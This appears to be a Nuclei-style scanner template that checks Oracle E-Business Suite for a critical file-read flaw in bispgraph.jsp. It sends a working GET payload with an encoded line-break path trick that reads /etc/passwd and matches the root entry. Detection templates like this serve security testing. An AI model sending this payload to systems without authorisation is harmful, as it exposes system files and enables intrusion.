id: oracle-ebs-bispgrapgh-file-read
info:
  name: Oracle EBS Bispgraph File Access
  author: "Alfie Njeru (@emenalf) - https://the-infosec.com"
  severity: Critical
requests:
  - method: GET
    path:
      - "{{BaseURL}}/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/"

    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"
        part: body